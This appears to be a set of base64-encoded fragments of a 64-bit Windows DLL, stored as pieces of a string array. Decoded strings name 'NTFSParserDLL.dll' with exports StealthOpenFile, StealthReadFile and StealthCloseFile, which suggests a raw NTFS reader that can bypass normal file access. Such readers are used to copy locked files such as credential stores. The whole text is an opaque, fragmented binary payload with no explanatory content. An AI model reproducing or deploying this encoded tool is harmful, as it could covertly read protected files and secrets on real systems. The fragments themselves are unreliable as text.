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','i1EwSDvCdg0zwEiDxDhBX0FeXl3DSI0MMEyJZCRwTIlsJDBIO8p2BIvyK/CLTRQz0kiJXCRgSPfxRIvpSIl8JGhEK+pMi+BEO+l0aUyLTWhIjUQkeEG4AQAAAEiJRCQoiUwkIEiLzUmL1OgS/v//hcAPhOcAAACLRRQ5RCR4D4XaAAAAi9BBi8WL/kQ77kmLz0EPQv1IK9BIA1VoRIvHiXwkeIvf6Mc5AABBAT5MA/sr90n/xIX2D4SaAAAAi10UM9KLxvfzi/iFwHRGSI1EJHgPr99Ni89IiUQkKESLx0mL1EiLzYlcJCDok/3//4XAdGyLTCR4O8t1ZIvDM9JMA+dMA/iLxvd1FEEBDovyhdJ0RUyLTWhIjUQkeEG4AQAAAEiJRCQoi0UUSYvUSIvNiUQkIOhJ/f//hcB0IotFFDlEJHh1GUiLVWhEi8ZJi8/oHTkAAEEBNrgBAAAA6wIzwEiLfCRoSItcJGBMi2QkcEyLbCQwSIPEOEFfQV5eXcPMzEiJXCQIV0iD7CBIjQW3ZgEASIvZi/pIiQFIi0kQSIXJdAXoST8AAED2xwF0CEiLy+g7PwAASIvDSItcJDBIg8QgX8PMzMzMzMzMzMzMzMzMSI0FcWYBAEiJAUiLSRBIhckPhQk/AADzw8zMzMzMzMxIiVwkCEiJdCQQV0iD','HQAaABhAG4AIABvAG4AYwBlAC4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4ADQAKAAAAAAAAAAAAAAAAAFIANgAwADMAMgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwBjAGEAbABlACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAA0ACgAAAAAAAAAAAAAAAABSADYAMAAzADMADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAdQBzAGUAIABNAFMASQBMACAAYwBvAGQAZQAgAGYAcgBvAG0AIAB0AGgAaQBzACAAYQBzAHMAZQBtAGIAbAB5ACAAZAB1AHIAaQBuAGcAIABuAGEAdABpAHYAZQAgAGMAbwBkAGUAIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ACgBUAGgAaQBzACAAaQBuAGQAaQBjAGEAdABlAHMAIABhACAAYgB1AGcAIABpAG4AIAB5AG8AdQByACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC4AIABJAHQAIABpAHMAIABtAG8AcwB0ACAAbABpAGsAZQBsAHkAIAB0AGgAZQAgAHIAZQBzAHUAbAB0ACAAbwBmACAAYwBhAGwAbABpAG4AZwAgAGEAbgAgAE0AUwBJAEwALQBjAG8AbQBwAGkAbABlAGQAIAAoAC8AYwBsAHIAKQAgAGYAdQBuAGMAdABpAG8AbgAgAGYAcgBvAG0AIABhACAAbgBhAHQAaQB2AGUAIABjAG8AbgBzAHQAcgB1AGMAdABvAHIAIABvAHIAIABmAHIAbwBtACAARABsAGwATQBhAGkAbgAuAA0ACgAAAAAAUgA2ADAAMwA0AA0ACgAtACAAaQBuAGMAbwBuAHMAaQBzAHQAZQBuAHQAIABvAG4AZQB4AGkAdAAgAGIAZQBnAGkAbgAtAGUAbgBkACAAdgBhAHIAaQBhAGIAbABlAHMADQAKAAAAAABEAE8ATQBBAEkATgAgAGUAcgByAG8AcgANAAoAAAAAAFMASQBOAEcAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAVABMAE8AUwBTACAAZQByAHIAbwByAA0ACgAAAA0ACgAAAAAAAAAAAHIAdQBuAHQAaQBtAGUAIABlAHIAcgBvAHIAIAAAAAAAUgB1AG4AdABpAG0AZQAgAEUAcgByAG8AcgAhAAoACgBQAHIAbwBnAHIAYQBtADoAIAAAAAAAAAA8AHAAcgBvAGcAcgBhAG0AIABuAGEAbQBlACAAdQBuAGsAbgBvAHcAbgA+AAAAAAAuAC4ALgAAAAoACgAAAAAAAAAAAAAAAABNAGkAYwByAG8AcwBvAGYAdAAgAFYAaQBzAHUAYQBsACAAQwArACsAIABSAHUAbgB0AGkAbQBlACAATABpAGIAcgBhAHIAeQAAAAAAAAAAADA0AYABAAAAQDQBgAEAAABQNAGAAQAAAGA0AYABAAAAagBhAC0ASgBQAAAAAAAAAHoAaAAtAEMATgAAAAAAAABrAG8ALQBLAFIAAAAAAAAAegBoAC0AVABXAAAAU3VuAE1vbgBUdWUAV2VkAFRodQBGcmkAU2F0AFN1bmRheQAATW9uZGF5AABUdWVzZGF5AFdlZG5lc2RheQAAAAAAAABUaHVyc2RheQAAAABGcmlkYXkAAAAAAABTYXR1cmRheQAAAABKYW4ARmViAE1hcgBBcHIATWF5AEp1bgBKdWwAQXVnAFNlcABPY3QATm92AERlYwAAAAAASmFudWFyeQBGZWJydWFyeQAAAABNYXJjaAAAAEFwcmlsAAAASnVuZQAAAABKdWx5AAAAAEF1Z3VzdAAAAAAAAFNlcHRlbWJlcgAAAAAAAABPY3RvYmVyAE5vdmVtYmVyAAAAAAAAAABEZWNlbWJlcgAAAABBTQAAUE0AAAAAAABNTS9kZC95eQAAAAAAAAAAZGRkZCwgTU1NTSBkZCwgeXl5eQAAAAAASEg6bW06c3MAAAAAAAAAAFMAdQBuAAAATQBvAG4AAABUAHUAZQAAAFcAZQBkAAAAVABoAHUAAABGAHIAaQAAAFMAYQB0AAAAUwB1AG4AZABhAHkAAAAAAE0AbwBuAGQAYQB5AAAAAABUAHUAZQBzAGQAYQB5AAAAVwBlAGQAbgBlAHMAZABhAHkAAAAAAAAAVABoAHUAcgBzAGQAYQB5AAAAAAAAAAAARgByAGkAZABhAHkAAAAAAFMAYQB0AHUAcgBkAGEAeQAAAAAAAAAAAEoAYQBuAAAARgBlAGIAAABNAGEAcgAAAEEAcAByAAAATQBhAHkAAABKAHUAbgAAAEoAdQBsAAAAQQB1AGcAAABTAGUAcAAAAE8AYwB0AAAATgBvAHYAAABEAGUAYwAAAEoAYQBuAHUAYQByAHkAAABGAGUAYgByAHUAYQByAHkAAAAAAAAAAABNAGEAcgBjAGgAAAAAAAAAQQBwAHIAaQBsAAAAAAAAAEoAdQBuAGUAAAAAAAAAAABKAHUAbAB5AAAAAAAAAAAAQQB1AGcAdQBzAHQAAAAAAFMAZQBwAHQAZQBtAGIAZQByAAAAAAAAAE8AYwB0AG8AYgBlAHIAAABOAG8AdgBlAG0AYgBlAHIAAAAAAAAAAABEAGUAYwBlAG0AYgBlAHIAAAAAAEEATQAAAAAAUABNAAAAAAAAAAAATQBNAC8AZABkAC8AeQB5AAAAAAAAAAAAZABkAGQAZAAsACAATQBNAE0ATQAgAGQAZAAsACAAeQB5AHkAeQAAAEgASAA6AG0AbQA6AHMAcwAAAAAAAAAAAGUAbgAtAFUAUwAAAAAAAABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAAAAAAAAAAAEZsc0FsbG9jAAAAAAAAAABGbHNGcmVlAEZsc0dldFZhbHVlAAAAAABGbHNTZXRWYWx1ZQAAAAAASW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkV4AAAAAABDcmVhdGVTZW1hcGhvcmVFeFcAAAAAAABTZXRUaHJlYWRTdGFja0d1YXJhbnRlZQBDcmVhdGVUaHJlYWRwb29sVGltZXIAAABTZXRUaHJlYWRwb29sVGltZXIAAAAAAABXYWl0Rm9yVGhyZWFkcG9vbFRpbWVyQ2FsbGJhY2tzAENsb3NlVGhyZWFkcG9vbFRpbWVyAAAAAENyZWF0ZVRocmVhZHBvb2xXYWl0AAAAAFNldFRocmVhZHBvb2xXYWl0AAAAAAAAAENsb3NlVGhyZWFkcG9vbFdhaXQAAAAAAEZsdXNoUHJvY2Vzc1dyaXRlQnVmZmVycwAAAAAAAAAARnJlZUxpYnJhcnlXaGVuQ2FsbGJhY2tSZXR1cm5zAABHZXRDdXJyZW50UHJvY2Vzc29yTnVtYmVyAAAAAAAAAEdldExvZ2ljYWxQcm9jZXNzb3JJbmZvcm1hdGlvbgAAQ3JlYXRlU3ltYm9saWNMaW5rVwAAAAAAU2V0RGVmYXVsdERsbERpcmVjdG9yaWVzAAAAAAAAAABFbnVtU3lzdGVtTG9jYWxlc0V4AAAAAABDb21wYXJlU3RyaW5nRXgAR2V0RGF','MUyJcBhMiXAITIlwEEyJOESJcCBIiXgoZoN/CgB0EUiNRxBIiUMISIvL6Hv2//+Q6wNJi965EAAAAOgfNQAASIXAdCBIiVgITIkwSItOYEiFyXUGSIlGWOsDSIkBSIlGYP9GUPZHDAJ1Gg+3RwhIA/gPt0cIA+hIi0ZwO2gUD4Zm////SItcJFhIi2wkYEiLdCRoSIPEMEFfQV5fw8zMzMzMzMzMzMzMzMxIiVwkCFdIg+wgSI0Fj1oBAIvaSIv5SIkB6ILu///2wwF0CEiLz+glNAAASIvHSItcJDBIg8QgX8PMzMzMzMzMSIvEVldBVEFWQVdIg+xASMdAyP7///9IiVgYSIloIEmL8EiL2kiL+YtRGEmLyOgt/P//TIvwRItPGEQPt1cQM9JBi8FB9/KL6EGL0UgPrxNIiVQkeEyLF0iNRCRwSIlEJCBNi8ZIjVQkeEiLz0H/UhiFwA+EJQEAAItHGDlEJHAPhRgBAABBgT5JTkRYD4ULAQAAQQ+3RgRGD7cMMEmNVgJIA9BJi85FM/9Fi8eF7X4uD7dHENHo/8hImEiNDEFmRDkJD4XVAAAAD7cCZokBSIPBAkH/wEiDwgJEO8V80kGLRhhJjX4YSAP4D7dvCEE7bhwPh58AAABMjSXRWQEAkLkwAAAA6GozAABIi9hIiUQkeEiFwHQxTIl4GEyJeAhMiXgQTIkgRIl4IEiJeChmg38KAHQRSI1HEEiJQwhIi8voe/T//5DrA0mL37kQAAAA6B8zAABIhcB0IEiJWAhMiThIi04YSIXJdQZIiUYQ6wNIiQFIiUYY/0YI9kcMAnUXD7dHCEgD+A+3RwgD6EE7bhwPhmn///+4AQAAAOsCM8BMjVwkQEmLW0BJi2tISYvjQV9BXkFcX17DzMzMzMzMzEiJXCQIV0iD7DBIjQV/WAEASIv6uigAAABIiQFIjQW9GgAASIvZTI0NkxoAAESNQuhIgcGoAAAASIlEJCDodjYAAEiJewhIjXsgM8BIx0MQAAAAAEjHQxj/////uRAAAADzSKvHg6AAAAD/////SIvDSItcJEBIg8QwX8PMzMzMSIlMJAhXSIPsMEjHRCQg/v///0iJXCRIi/pIi9lIjQXsVwEASIkB6LQAAABIi0sQSIXJdAboljEAAJBIjYuoAAAATI0NFxoAALooAAAARI1C6OhFNgAAQPbHAXQISIvL6GsxAABIi8NIi1wkSEiDxDBfw8zMzMzMzMzMzMzMzMxIiUwkCFNIg+wwSMdEJCD+////SIvZSI0Fc1cBAEiJAeg7AAAASItLEEiFyXQG6B0xAACQSI2LqAAAAEyNDZ4ZAAC6KAAAAESNQu','USIvOiVwkKEiJbCQg6Lmw//+FwA+FpgEAAOsHi5wk4AAAAIN9DAB1Begl2///RIu0JNgAAABIjUQkYEyJfCQwSIlEJChIjYQksAAAAESLw0WLzkiL1UmLzEiJRCQg6ASu//+LjCSwAAAAO0wkYA+DTAEAAEiNeAxMjW/0RTt1AA+MIwEAAEQ7d/gPjxkBAADoLrH//0hjD0iNFIlIY08ESI0UkYN8EPAAdCPoE7H//0hjD0iNFIlIY08ESI0UkUhjXBDw6Pqw//9IA8PrAjPASIXAdEro6bD//0hjD0iNFIlIY08ESI0UkYN8EPAAdCPozrD//0hjD0iNFIlIY08ESI0UkUhjXBDw6LWw//9IA8PrAjPAgHgQAA+FgwAAAOifsP//SGMPSI0UiUhjTwRIjRSR9kQQ7EB1aOiEsP//iw9Mi4QkwAAAAMZEJFgAxkQkUAH/yUhjyU2Lz0iNFIlIjQyQSGNHBEmL1EgDyEiLhCToAAAASIlEJEiLhCTgAAAAiUQkQEyJbCQ4SINkJDAASIlMJChIi85IiWwkIOhZ+P//i4wksAAAAP/BSIPHFImMJLAAAAA7TCRgD4K4/v//SIucJLgAAABIg8RwQV9BXkFdQVxfXl3DzMzMSIlcJAhIiWwkEEiJdCQYV0FUQVVBVkFXSIPsIEiL8kyL6UiF0g+EoQAAADP/RTL2OTp+eOjHr///SIvQSYtFMExjeAxJg8cETAP66LCv//9Ii9BJi0UwSGNIDIssCoXtfkRIY8dMjSSA6JKv//9Ii9hJYwdIA9jobK///0hjTgRNi0UwSo0EoEiL00gDyOgxCQAAhcB1DP/NSYPHBIXtf8jrA0G2Af/HOz58iEiLXCR','FRhdAACLwEgxRRD/FUReAABIjU0gi8BIMUUQ/xUsXgAAi0UgSMHgIEiNTRBIM0UgSDNFEEgzwUi5////////AABII8FIuTOi3y2ZKwAASDvDSA9EwUiJBVENAQBIi1wkSEj30EiJBUoNAQBIg8QgXcNIi8RIiVgISIloEEiJcBhIiXggQVZIg+xA/xXVXQAARTP2SIv4SIXAD4SpAAAASI','4SIPEQEFfQV5BXUFcX8PMzMxIg+woSIXJdRnoyi8AAMcAFgAAAOgXIgAASIPI/0iDxCjDTIvBSIsNPG0BADPSSIPEKEj/JV+YAADMzMxIi8RIiVgISIloEEiJcBhIiXggQVZIg+wgM9tIi/JIi+lBg87/RTPASIvWSIvN6KVYAABIi/hIhcB1JzkFU2YBAHYfi8v/FRmYAACNi+gDAAA7DT1mAQCL2UEPR95BO951w0iLXCQwSItsJDhIi3QkQEiLx0iLfCRISIPEIEFew0iLxEiJWAhIiWgQSIlwGEiJeCBBVkiD7CCLNfVlAQAz/0iL6UGDzv9Ii83oQAcAAEiL2EiFwHUlhfZ0IYvP/xWglwAAizXKZQEAjY/oAwAAO86L+UEPR/5BO/51y0iLbCQ4SIt0JEBIi3wkSEiLw0iLXCQwSIPEIEFew8xIi8RIiVgISIloEEiJcBhIiXggQVZIg+wgM9tIi/JIi+lBg87/SIvWSIvN6NhWAABIi/hIhcB1LEiF9nQnOQVVZQEAdh+Ly/8VG5cAAI2L6AMAADsNP2UBAIvZQQ9H3kE73nXBSItcJDBIi','rQBAAAAAADQtAEAAAAAAOy0AQAAAAAA/LQBAAAAAAAMtQEAAAAAACC1AQAAAAAAPLUBAAAAAABOtQEAAAAAAGS1AQAAAAAAeLUBAAAAAACKtQEAAAAAAKS1AQAAAAAAsrUBAAAAAADAtQEAAAAAANa1AQAAAAAA6LUBAAAAAAD0tQEAAAAAAPy1AQAAAAAADLYBAAAAAAAYtgEAAAAAAC62AQAAA